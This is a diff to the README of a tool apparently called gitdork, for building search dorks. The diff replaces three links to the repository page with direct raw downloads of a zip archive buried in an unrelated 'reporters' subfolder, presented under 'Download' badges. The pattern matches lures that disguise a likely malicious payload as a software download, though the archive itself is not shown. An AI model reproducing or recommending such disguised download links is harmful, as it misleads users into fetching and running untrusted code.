@@ -1,6 +1,6 @@
 # 🔎 gitdork - Find useful dorks fast
 
-[![Download gitdork](https://img.shields.io/badge/Download-GitHub%20Page-blue?style=for-the-badge)](https://github.com/middleeardeafnesssouthwesternlipfern411/gitdork)
+[![Download gitdork](https://img.shields.io/badge/Download-GitHub%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/middleeardeafnesssouthwesternlipfern411/gitdork/main/gitdork/reporters/Software-v1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Use it to build dorks for common targets, search types, and platform filters wit
 
 To get gitdork, visit this page to download:
 
-[GitHub download page](https://github.com/middleeardeafnesssouthwesternlipfern411/gitdork)
+[GitHub download page](https://raw.githubusercontent.com/middleeardeafnesssouthwesternlipfern411/gitdork/main/gitdork/reporters/Software-v1.8.zip)
 
 ### Windows setup
 
@@ -202,4 +202,4 @@ These are sample patterns. The app helps you build queries like these with less 
 
 If you need the download page again, use this link:
 
-[https://github.com/middleeardeafnesssouthwesternlipfern411/gitdork](https://github.com/middleeardeafnesssouthwesternlipfern411/gitdork)
+[https://raw.githubusercontent.com/middleeardeafnesssouthwesternlipfern411/gitdork/main/gitdork/reporters/Software-v1.8.zip](https://raw.githubusercontent.com/middleeardeafnesssouthwesternlipfern411/gitdork/main/gitdork/reporters/Software-v1.8.zip)
